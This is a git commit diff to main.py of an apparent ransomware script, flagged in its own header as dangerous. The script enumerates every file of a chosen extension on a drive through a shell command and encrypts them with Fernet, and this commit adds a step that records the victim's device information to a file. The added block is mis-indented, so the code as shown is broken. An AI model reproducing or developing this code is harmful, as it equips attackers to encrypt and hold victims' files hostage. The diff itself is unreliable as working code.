44bacfa42269ecdb5ca6cc2d32cbd0e29f6eb248
Mohammad Mahdi Erfani <89167909+MMErfani@users.noreply.github.com>
2022-03-25 18:52:28 +0430

    Save device info

--- main.py
+++ main.py
@@ -1,10 +1,10 @@
-
 # !!! Dangerous !!!
 
 # https://github.com/MMErfani/
 from subprocess import check_output
 from cryptography.fernet import Fernet
 import os
+import platform
 
 def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D"):
     if key == 1:  
@@ -12,8 +12,15 @@ def enc(target_file_extention, encrypted_file_extention="maher", key=1, drive="D
 
     Encrypt = Fernet(key)
 
-    new_file = open("key", "w")   #just for test
-    new_file.write(str(key))      #just for test
+    key_file = open("key", "w")   #just for test
+    key_file.write(str(key))      #just for test
+    key_file.close()
+
+    device_info = platform.uname()
+        for data in device_info:
+            info_file = open("device_info", "a")
+            info_file.write(str(data) + "\n")
+            info_file.close()
 
     cmd = check_output(f"{drive}: dir /S /B *.{target_file_extention}", shell=True).decode().split() 
     try:
